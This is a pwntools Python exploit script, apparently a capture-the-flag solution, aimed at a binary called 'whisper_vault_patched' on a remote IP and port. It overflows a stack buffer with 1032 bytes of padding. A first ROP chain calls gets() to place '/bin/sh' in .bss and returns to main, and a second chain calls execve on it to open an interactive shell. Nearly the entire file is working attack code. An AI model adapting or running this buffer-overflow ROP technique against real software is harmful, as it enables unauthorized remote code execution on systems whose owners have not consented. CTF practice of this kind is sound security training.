#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './whisper_vault_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc 94.237.61.52 35148'.split()

libc_path = ''
ld_path = ''
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')

def se(x):
    return str(x).encode()

def cyc(x):
    n = 8 if context.arch == 'amd64' else 4
    return cyclic(x, n=n)


gdbscript = '''
b *(main+0)
continue
'''.format(**locals())

p = start()
off = 1032
rop = ROP(exe)
binsh = exe.bss()+32
rop.gets(binsh)
payload = flat(
    b'a' * off,
    rop.chain(),
    exe.sym.main,
)
p.sendline(payload)
p.sendline(b'/bin/sh')

rop2 = ROP(exe)
rop2.execve(binsh, 0, 0)

payload = flat(
    b'a' * off,
    rop2.chain(),
)
p.sendline(payload)
p.interactive()
